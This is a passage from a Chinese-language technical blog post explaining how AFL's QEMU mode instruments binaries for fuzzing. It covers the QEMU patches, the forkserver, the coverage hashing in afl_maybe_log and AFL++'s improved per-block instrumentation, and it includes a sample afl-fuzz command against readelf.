class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/linux-user/syscall.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/linux-user/syscall.c2017-08-22 14:34:03.193088186 -0700</span><br><span class="hljs-meta">@@ -111,6 +111,7 @@</span><br> #include &lt;linux/if_bridge.h&gt;<br> #endif<br> #include &lt;linux/audit.h&gt;<br><span class="hljs-addition">+#include &lt;linux/sockios.h&gt;</span><br> #include "linux_loop.h"<br> #include "uname.h"<br><br><span class="hljs-meta">@@ -116,6 +116,8 @@</span><br> <br> #include "qemu.h"<br> <br><span class="hljs-addition">+extern unsigned int afl_forksrv_pid;</span><br><span class="hljs-addition">+</span><br> #ifndef CLONE_IO<br> #define CLONE_IO                0x80000000      /* Clone io context */<br> #endif<br><span class="hljs-meta">@@ -256,6 +257,7 @@</span><br> #endif<br> <br> #ifdef __NR_gettid<br><span class="hljs-addition">+#define __NR_sys_gettid __NR_gettid</span><br><span class="hljs-deletion">-_syscall0(int, gettid)</span><br><span class="hljs-addition">+_syscall0(int, sys_gettid)</span><br> #else<br> /* This is a replacement for the host gettid() and must return a host<br><span class="hljs-meta">@@ -11688,8 +11690,21 @@</span><br>         break;<br> <br>     case TARGET_NR_tgkill:<br><span class="hljs-deletion">-        ret = get_errno(safe_tgkill((int)arg1, (int)arg2,</span><br><span class="hljs-deletion">-                        target_to_host_signal(arg3)));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+        {</span><br><span class="hljs-addition">+          int pid  = (int)arg1,</span><br><span class="hljs-addition">+              tgid = (int)arg2,</span><br><span class="hljs-addition">+              sig  = (int)arg3;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          /* Not entirely sure if the below is correct for all architectures. */</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          if(afl_forksrv_pid &amp;&amp; afl_forksrv_pid == pid &amp;&amp; sig == SIGABRT)</span><br><span class="hljs-addition">+              pid = tgid = getpid();</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          ret = get_errno(safe_tgkill(pid, tgid, target_to_host_signal(sig)));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+        }</span><br><span class="hljs-addition">+</span><br>         break;<br> <br> #ifdef TARGET_NR_set_robust_list<br></code></pre></td></tr></tbody></table></figure><p>重新运行脚本！</p><p><img src="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png"></p><p>Now, just enjoy it!:happy:</p><h3 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h3><p>使用方法很简单，仅需在afl-fuzz中添加-Q参数即可。例如，对ubuntu操作系统自带的readelf进行模糊测试，执行如下命令：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -m none -Q -i /home/xiechen/fuzzing-corpus/exe/mopt/ -o out_readelf -d readelf -a @@<br></code></pre></td></tr></tbody></table></figure><p><img src="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/2.png"></p><h3 id="2-3-原理-4"><a href="#2-3-原理-4" class="headerlink" title="2.3 原理[4]"></a>2.3 原理[4]</h3><blockquote><p><code>qemu</code> 在执行一个程序时，从被执行程序的入口点开始对基本块翻译并执行，为了提升效率，<code>qemu</code>会把翻译出来的基本块存放到 <code>cache</code> 中，当 <code>qemu</code> 要执行一个基本块时首先判断基本块是否在 <code>cache</code> 中，如果在 <code>cache</code> 中则直接执行基本块，否则会翻译基本块并执行。</p></blockquote><p>在<a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/cpu-exec.diff">cpu-exec.diff</a>中，<code>afl-qemu-cpu-inl.h</code>是AFL为适用于QEMU的forkserver和覆盖率统计的头文件：</p><h4 id="2-3-1-AFL-QEMU-CPU-SNIPPET2"><a href="#2-3-1-AFL-QEMU-CPU-SNIPPET2" class="headerlink" title="2.3.1 AFL_QEMU_CPU_SNIPPET2"></a>2.3.1 AFL_QEMU_CPU_SNIPPET2</h4><ul><li><code>AFL_QEMU_CPU_SNIPPET2</code>被植入到<code>cpu-exec.c</code>的<code>cpu_tb_exec()</code>函数中，该函数用于执行一个TB，并根据需要修复CPU状态；</li></ul><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c2017-08-22 14:34:55.868730680 -0700</span><br><span class="hljs-meta">@@ -36,6 +36,8 @@</span><br> #include "sysemu/cpus.h"<br> #include "sysemu/replay.h"<br> <br><span class="hljs-addition">+#include "../patches/afl-qemu-cpu-inl.h"</span><br><span class="hljs-addition">+</span><br> /* -icount align implementation. */<br> <br> typedef struct SyncClocks {<br><span class="hljs-meta">@@ -144,6 +146,8 @@</span><br>     int tb_exit;<br>     uint8_t *tb_ptr = itb-&gt;tc_ptr;<br> <br><span class="hljs-addition">+    AFL_QEMU_CPU_SNIPPET2;</span><br><span class="hljs-addition">+</span><br>     qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,<br>                            "Trace %p [%d: " TARGET_FMT_lx "] %s\n",<br>                            itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,<br><span class="hljs-meta">@@ -365,6 +369,7 @@</span><br>             if (!tb) {<br>                 /* if no translated code available, then translate it now */<br>                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);<br><span class="hljs-addition">+                AFL_QEMU_CPU_SNIPPET1;</span><br>             }<br> <br>             mmap_unlock();<br></code></pre></td></tr></tbody></table></figure><ul><li><p><a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h"><code>AFL_QEMU_CPU_SNIPPET2</code></a>：这里的思路和AFL基于汇编的插桩一致，就是在QEMU执行每一个TB之前，判断当前的PC是否为入口点（<code>afl_entry_point</code> 在 <a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/elfload.diff">elfload.c</a>中被赋值）。如果是入口点，则在此处获取共享内存区域地址，并启用forkserver。请注意，这里的<code>afl_forkserver</code>其实是一个死循环，也就是整个elf程序在这里被阻塞，直到fuzzer有数据需要程序运行时才会fork出一个子进程</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do { \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span>(itb-&gt;pc == afl_entry_point) { \</span><br><span class="hljs-meta">      afl_setup(); \</span><br><span class="hljs-meta">      afl_forkserver(cpu); \</span><br><span class="hljs-meta">    } \</span><br><span class="hljs-meta">    afl_maybe_log(itb-&gt;pc); \</span><br><span class="hljs-meta">  } while (0)</span><br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_entry_point</code>：<ul><li><code>elfload.c</code>可以看作是包含QEMU载入ELF文件相关操作的一个c文件，其中<code>load_elf_image()</code>函数用以将ELF镜像载入到地址空间中。这里的<code>info-&gt;entry</code>其实就是ELF文件入口地址，其值为<code>ehdr-&gt;e_entry + load_bias</code>。注意到这里有一个<code>load_bias</code>，这个值其实上是ELF文件加载到内存中的一个偏差值。</li><li>在<code>elfload.c</code>处将<code>afl_entry_point</code>赋值为ELF文件的入口地址，然后在翻译每个TB之前判断该TB是否为初始块，如果为初始块，则在此处设置forkserver，这里的想法与AFL的插桩逻辑是一致的。</li></ul></li></ul><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/linux-user/elfload.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/linux-user/elfload.c2017-08-22 14:33:57.397127516 -0700</span><br><span class="hljs-meta">@@ -20,6 +20,8 @@</span><br> <br> #define ELF_OSABI   ELFOSABI_SYSV<br> <br><span class="hljs-addition">+extern abi_ulong afl_entry_point, afl_start_code, afl_end_code;</span><br><span class="hljs-addition">+</span><br> /* from personality.h */<br> <br> /*<br><span class="hljs-meta">@@ -2085,6 +2087,8 @@</span><br>     info-&gt;brk = 0;<br>     info-&gt;elf_flags = ehdr-&gt;e_flags;<br> <br><span class="hljs-addition">+    if (!afl_entry_point) afl_entry_point = info-&gt;entry;  // </span><br><span class="hljs-addition">+</span><br>     for (i = 0; i &lt; ehdr-&gt;e_phnum; i++) {<br>         struct elf_phdr *eppnt = phdr + i;<br>         if (eppnt-&gt;p_type == PT_LOAD) {<br><span class="hljs-meta">@@ -2118,9 +2122,11 @@</span><br>             if (elf_prot &amp; PROT_EXEC) {<br>                 if (vaddr &lt; info-&gt;start_code) {<br>                     info-&gt;start_code = vaddr;<br><span class="hljs-addition">+                    if (!afl_start_code) afl_start_code = vaddr;</span><br>                 }<br>                 if (vaddr_ef &gt; info-&gt;end_code) {<br>                     info-&gt;end_code = vaddr_ef;<br><span class="hljs-addition">+                    if (!afl_end_code) afl_end_code = vaddr_ef;</span><br>                 }<br>             }<br>             if (elf_prot &amp; PROT_WRITE) {<br></code></pre></td></tr></tbody></table></figure></li></ul><h4 id="2-3-2-AFL-QEMU-CPU-SNIPPET1"><a href="#2-3-2-AFL-QEMU-CPU-SNIPPET1" class="headerlink" title="2.3.2 AFL_QEMU_CPU_SNIPPET1"></a>2.3.2 AFL_QEMU_CPU_SNIPPET1</h4><ul><li><p><a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h"><code>AFL_QEMU_CPU_SNIPPET1</code></a>被植入到QEMU的<code>tb_find()</code>函数中。<code>tb_find()</code>函数用于在哈希表中寻找当前PC所对应的TB，如果没找着该TB，则调用<code>tb_gen_code()</code>来进行动态翻译，之后便附加上了<code>AFL_QEMU_CPU_SNIPPET1</code>所对应的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do { \</span><br><span class="hljs-meta">    afl_request_tsl(pc, cs_base, flags); \</span><br><span class="hljs-meta">  } while (0)</span><br><br>...<br><br><span class="hljs-comment">/* This code is invoked whenever QEMU decides that it doesn't have a</span><br><span class="hljs-comment">   translation of a particular block and needs to compute it. When this happens,</span><br><span class="hljs-comment">   we tell the parent to mirror the operation, so that the next fork() has a</span><br><span class="hljs-comment">   cached copy. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_request_tsl</span><span class="hljs-params">(target_ulong pc, target_ulong cb, <span class="hljs-type">uint64_t</span> flags)</span> {<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">afl_tsl</span> <span class="hljs-title">t</span>;</span><br><br>  <span class="hljs-keyword">if</span> (!afl_fork_child) <span class="hljs-keyword">return</span>;<br><br>  t.pc      = pc;<br>  t.cs_base = cb;<br>  t.flags   = flags;<br><br>  <span class="hljs-keyword">if</span> (write(TSL_FD, &amp;t, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl)) != <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl))<br>    <span class="hljs-keyword">return</span>;<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>这里将当前TB的信息保存到结构体<code>afl_tsl</code>中，并将该信息发送回fuzzer。而<code>afl_wait_tsl()</code>函数就是用来等待fork子进程通过管道传递回<code>afl_tsl</code>的信息：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">afl_wait_tsl</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> fd)</span> </span>{<br><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">afl_tsl</span> t;<br>  TranslationBlock *tb;<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br><br>    <span class="hljs-comment">/* Broken pipe means it's time to return to the fork server routine. */</span><br><span class="hljs-comment">/* 注意到这里是一个死循环，不断地获取TB的相关信息，那这里在什么时候break呢？子进程杀死或者关闭了管道之后就会break */</span> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">read</span>(fd, &amp;t, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl)) != <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl))<br>      <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">/* 下面这部分的代码是不是有点多余？因为在cpu-exec.c中其实已经存在有相同的处理逻辑了 */</span> <br>    tb = <span class="hljs-built_in">tb_htable_lookup</span>(cpu, t.pc, t.cs_base, t.flags);<br><br>    <span class="hljs-keyword">if</span>(!tb) {<br>      <span class="hljs-built_in">mmap_lock</span>();<br>      <span class="hljs-built_in">tb_lock</span>();<br>      <span class="hljs-built_in">tb_gen_code</span>(cpu, t.pc, t.cs_base, t.flags, <span class="hljs-number">0</span>);<br>      <span class="hljs-built_in">mmap_unlock</span>();<br>      <span class="hljs-built_in">tb_unlock</span>();<br>    }<br><br>  }<br><br>  <span class="hljs-built_in">close</span>(fd);<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>这里的<code>struct afl_tsl t</code>就是象征性的获取一下，在后续的流程中并没有使用，这里其实就是监控子进程状态的一个处理过程。</p></li></ul><h4 id="2-3-3-afl-maybe-log"><a href="#2-3-3-afl-maybe-log" class="headerlink" title="2.3.3 afl_maybe_log()"></a>2.3.3 afl_maybe_log()</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> {<br><br>  <span class="hljs-type">static</span> __thread abi_ulong prev_loc;<br><br>  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><br><span class="hljs-comment">     Linux systems. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><br><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let's mangle</span><br><span class="hljs-comment">     the value to get something quasi-uniform. */</span><br><br>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>); <span class="hljs-comment">// 注意这里的转换操作！</span><br>  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><br><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;<br><br>  afl_area_ptr[cur_loc ^ prev_loc]++;<br>  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>cur_loc</code>是PC，注意到这里的索引值为<code>(cur_loc &gt;&gt; 4) ^ (cur_loc &lt;&lt; 8)</code>：代码注释中说指令地址可能对齐了，因此对该索引值进行了修改。这里其实关键的问题在于指令地址空间远大于哈希位图的大小，换言之很容易发生碰撞。我们这里假设PC值（32位）为0x04001234，假设下一次PC值（32位）为0x04011234，那么如果不进行上述的修改，与<code>MAP_SIZE</code>与的结果是相同的，因此会造成很严重的哈希位图碰撞问题，而且这个由于PC值本身空间范围很大，因此这种哈希位图碰撞问题格外的严重。所以这里必须进行相关的转换操作来避免PC值的碰撞，从而有效区分不同PC值（i.e.不同的基本块）。</li></ul><h3 id="2-4-改进"><a href="#2-4-改进" class="headerlink" title="2.4 改进"></a>2.4 改进</h3><ul><li>参考资料[4]中针对AFL中QEMU模式存在的问题进行了阐述，如下：</li></ul><blockquote><p>在原始的 <code>AFL qemu</code> 版本中获取覆盖率的方式是在每次翻译基本块前调用 <code>afl_maybe_log</code> 往 <code>afl-fuzz</code> 同步覆盖率信息，这种方式有一个问题就是由于 <code>qemu</code> 会把顺序执行的基本块 <code>chain</code> 一起，这样可以提升执行速度。但是在这种方式下有的基本块就会由于 <code>chain</code> 的原因导致追踪不到基本块的执行， <code>afl</code> 的处理方式是禁用 <code>qemu</code> 的 <code>chain</code> 功能，这样则会削减 <code>qemu</code> 的性能（<span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 应该不太会影响<code>qemu</code>的性能吧，但确实会额外添加一些AFL本身的执行）。</p></blockquote><ul><li>我们在第一节中阐述的QEMU特性中，其中有一个就是<code>Direct block chaining</code>。其实就是说，原本能够顺序在一起的基本块，比如A-&gt;B-&gt;C，QEMU可以将这三个块链起来，从而整合为一个块A’。然而这样的操作会导致AFL跟踪基本块执行的不精确，因此AFL禁用了QEMU的chain功能</li><li>那<a href="https://github.com/AFLplusplus/qemuafl/blob/master">AFL++的QEMU模式</a>如何进行了改机呢？</li></ul><ol><li>将统计覆盖率插桩的代码插入到每个翻译的基本块前面，<a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/accel/tcg/translate-all.c#L2091C1-L2095C28">=&gt;代码</a>：</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Generates TCG code for AFL's tracing instrumentation. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_gen_trace</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br><br>  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><br><span class="hljs-comment">     Linux systems. */</span><br><br>  cur_block_is_good = afl_must_instrument(cur_loc);<br><br>  <span class="hljs-keyword">if</span> (!cur_block_is_good)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASLR is not a</span><br><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let's mangle</span><br><span class="hljs-comment">     the value to get something quasi-uniform. */</span><br><br>  <span class="hljs-comment">// cur_loc = (cur_loc &gt;&gt; 4) ^ (cur_loc &lt;&lt; 8);</span><br>  <span class="hljs-comment">// cur_loc &amp;= MAP_SIZE - 1;</span><br>  cur_loc = (<span class="hljs-type">uintptr_t</span>)(afl_hash_ip((<span class="hljs-type">uint64_t</span>)cur_loc));  <span class="hljs-comment">// &lt;==== 这里使用了一种更复杂的hash算法</span><br>  cur_loc &amp;= (MAP_SIZE - <span class="hljs-number">1</span>);<br><br>  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><br><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;<br><br>  TCGv cur_loc_v = tcg_const_tl(cur_loc);<br>  <span class="hljs-keyword">if</span> (unlikely(afl_track_unstable_log_fd() &gt;= <span class="hljs-number">0</span>)) {<br>    gen_helper_afl_maybe_log_trace(cur_loc_v);<br>  } <span class="hljs-keyword">else</span> {<br>    gen_helper_afl_maybe_log(cur_loc_v);<br>  }<br>  tcg_temp_free(cur_loc_v);<br><br>}<br><br><span class="hljs-comment">/* Called with mmap_lock held for user mode emulation.  */</span><br>TranslationBlock *<span class="hljs-title function_">tb_gen_code</span><span class="hljs-params">(CPUState *cpu,</span><br><span class="hljs-params">                              target_ulong pc, target_ulong cs_base,</span><br><span class="hljs-params">                              <span class="hljs-type">uint32_t</span> flags, <span class="hljs-type">int</span> cflags)</span><br>...<br>    tcg_ctx-&gt;cpu = env_cpu(env);<br>    afl_gen_trace(pc);  <span class="hljs-comment">// &lt;==== 在每个基本块前插入覆盖率统计的代码（这个idea其实和clang-fast插桩方式是一致的）</span><br>    gen_intermediate_code(cpu, tb, max_insns);<br>    tcg_ctx-&gt;cpu = <span class="hljs-literal">NULL</span>;<br>    max_insns = tb-&gt;icount;<br>...<br></code></pre></td></tr></tbody></table></figure><p>这里需要注意的是<code>gen_helper_afl_maybe_log</code>和<code>gen_helper_afl_maybe_log_trace</code>这两个函数，这两个函数用于<a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/target/hexagon/README#L49">创建一个TCG的call调用</a>，并调用<code>afl_maybe_log</code>或<code>afl_maybe_log_trace</code>这两个函数。简而言之，这两个函数就是用于生成调用AFL进行覆盖率统计的相关函数，这些函数定义在accel/tcg/translate-all.c中：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">HELPER</span><span class="hljs-params">(afl_maybe_log)</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uintptr_t</span> afl_idx = cur_loc ^ afl_prev_loc;<br><br>  INC_AFL_AREA(afl_idx);<br><br>  <span class="hljs-comment">// afl_prev_loc = ((cur_loc &amp; (MAP_SIZE - 1) &gt;&gt; 1)) |</span><br>  <span class="hljs-comment">//                ((cur_loc &amp; 1) &lt;&lt; ((int)ceil(log2(MAP_SIZE)) -1));</span><br>  afl_prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">HELPER</span><span class="hljs-params">(afl_maybe_log_trace)</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uintptr_t</span> afl_idx = cur_loc;<br>  INC_AFL_AREA(afl_idx);<br>}<br></code></pre></td></tr></tbody></table></figure><p>include/exec/helper-head.h：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELPER(name) glue(helper_, name)</span><br></code></pre></td></tr></tbody></table></figure><p>include/exec/helper-gen.h:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_HELPER_FLAGS_1(name, flags, ret, t1)                        \</span><br><span class="hljs-meta">static inline void glue(gen_helper_, name)(dh_retvar_decl(ret)          \</span><br><span class="hljs-meta">    dh_arg_decl(t1, 1))                                                 \</span><br><span class="hljs-meta">{                                                                       \</span><br><span class="hljs-meta">  TCGTemp *args[1] = { dh_arg(t1, 1) };                                 \</span><br><span class="hljs-meta">  tcg_gen_callN(HELPER(name), dh_retvar(ret), 1, args);                 \</span><br><span class="hljs-meta">}</span><br></code></pre></td></tr></tbody></table></figure><p><code>afl_gen_trace()</code>用于在每个基本块前插入<code>afl_maybe_log</code>或<code>afl_maybe_log_trace</code>的函数调用，跟踪程序的覆盖情况。</p><ol start="2"><li><a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/accel/tcg/cpu-exec.c#L1380C1-L1380C1">与forkserver的同步</a>：</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 